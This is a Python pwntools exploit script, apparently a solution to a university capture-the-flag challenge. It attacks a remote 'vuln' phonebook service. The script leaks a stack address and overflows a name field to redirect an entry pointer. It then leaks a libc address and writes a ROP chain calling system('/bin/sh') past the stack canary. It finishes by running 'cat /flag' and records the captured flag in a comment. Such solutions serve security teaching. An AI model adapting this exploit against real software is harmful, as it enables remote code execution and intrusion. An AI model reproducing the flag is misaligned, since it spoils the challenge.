from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
b *(phonebook_show+20)
b *(main+358)
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33634)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)





# my own phone number is a stack leak
# use name field overflow while editing to craft name that overwrites next pointer to point on the stack
# then use show to leak stack content and obtain libc addr
# finally use next object to write ROP chain on the stack, utilizing libc leak
# we adjust fake entry so that name field is exactly behind the canary, allowing us to write our chain without
# touching the canary

p.recvuntil(b"Your phone number is +")
ret_addr_off = 0x7fffd0b3fa58-0x7fffd0b3fa10
command_addr = int(p.recvline().decode())
print(hex(command_addr))
ret_addr = command_addr+ret_addr_off

p.recvuntil(b"> ")
p.sendline(b"A") # add phonebook entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(b"A"*62)

p.recvuntil(b"> ")
p.sendline(b"A") # add phonebook entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000001")
p.recvuntil(b"Name: ")
p.sendline(b"F"*62)

p.recvuntil(b"> ")
p.sendline(b"E") # edit phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"1") # entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(cyclic(64)+p64(ret_addr))

p.recvuntil(b"> ")
p.sendline(b"S") # show phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"2") # entry 3
p.recvuntil(b"Phone number: ")
___libc_start_main = int.from_bytes(p.recvline()[:6][::-1])
p.recvuntil(b"Name: ")
p.recvline()


libc_start_off = 0x7f52511f024a-0x7f52511c9000

libc_addr = ___libc_start_main-libc_start_off
libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

payload = rop.chain()


p.recvuntil(b"> ")
p.sendline(b"E") # edit phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"1") # entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(cyclic(64)+p64(ret_addr-0x20)) # we want to have name of the third entry be at the address we want to write to

p.recvuntil(b"> ")
p.sendline(b"E") # edit phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"2") # entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(payload)


p.recvuntil(b"> ")
p.sendline(b"Q")


p.sendline(b"cat /flag")

p.interactive()


#softsec{sbkWK-1qmSnYibBcXSwPqnwHlhIYkII4AK-UIYIBvEYOMQWji_7kGlWa2CIvvnpg}